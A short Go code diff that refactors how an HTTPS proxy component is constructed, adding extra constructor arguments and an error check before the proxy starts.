@@ -300,7 +300,11 @@ if err != nil {
 	hs.Db = db
 	go hs.Start()
 
-	hp := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg)
+	hp, err := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	if err != nil {
+		log.Fatal("http_proxy: %v", err)
+		return
+	}
 	go hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
